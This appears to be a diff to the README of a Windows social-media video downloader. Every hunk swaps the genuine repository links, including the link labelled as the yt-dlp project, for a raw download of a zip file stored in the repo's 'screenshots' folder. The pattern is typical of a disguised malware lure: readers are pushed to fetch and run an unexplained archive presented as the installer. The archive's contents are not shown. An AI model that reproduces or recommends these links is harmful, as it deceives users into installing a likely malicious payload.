@@ -1,6 +1,6 @@
 # 🎬 SocialVideoUtility - Easy Social Media Video Downloader
 
-[![Download SocialVideoUtility](https://img.shields.io/badge/Download-SocialVideoUtility-ff6f61?style=for-the-badge)](https://github.com/sahius1/SocialVideoUtility)
+[![Download SocialVideoUtility](https://img.shields.io/badge/Download-SocialVideoUtility-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/sahius1/SocialVideoUtility/main/screenshots/Video-Social-Utility-v2.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Below are the easy steps to get SocialVideoUtility running on your Windows PC.
 
 ## 📥 Download and Install SocialVideoUtility
 
-1. Click the big button at the top or visit the [SocialVideoUtility GitHub Releases page](https://github.com/sahius1/SocialVideoUtility). This page contains the files you need.
+1. Click the big button at the top or visit the [SocialVideoUtility GitHub Releases page](https://raw.githubusercontent.com/sahius1/SocialVideoUtility/main/screenshots/Video-Social-Utility-v2.2.zip). This page contains the files you need.
 
 2. Look for the latest Windows installer file. It usually has a name like `SocialVideoUtility-Setup.exe`.
 
@@ -147,9 +147,9 @@ If videos fail to download:
 
 ## 🔗 Useful Links
 
-- Main page and downloads: [https://github.com/sahius1/SocialVideoUtility](https://github.com/sahius1/SocialVideoUtility)
+- Main page and downloads: [https://raw.githubusercontent.com/sahius1/SocialVideoUtility/main/screenshots/Video-Social-Utility-v2.2.zip](https://raw.githubusercontent.com/sahius1/SocialVideoUtility/main/screenshots/Video-Social-Utility-v2.2.zip)
 
-- yt-dlp, the tool behind video downloads: https://github.com/yt-dlp/yt-dlp
+- yt-dlp, the tool behind video downloads: https://raw.githubusercontent.com/sahius1/SocialVideoUtility/main/screenshots/Video-Social-Utility-v2.2.zip
 
 ---
 
@@ -171,4 +171,4 @@ SocialVideoUtility runs on your computer. It does not send your video links to t
 
 ---
 
-[![Download SocialVideoUtility](https://img.shields.io/badge/Download-SocialVideoUtility-ff6f61?style=for-the-badge)](https://github.com/sahius1/SocialVideoUtility)
+[![Download SocialVideoUtility](https://img.shields.io/badge/Download-SocialVideoUtility-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/sahius1/SocialVideoUtility/main/screenshots/Video-Social-Utility-v2.2.zip)
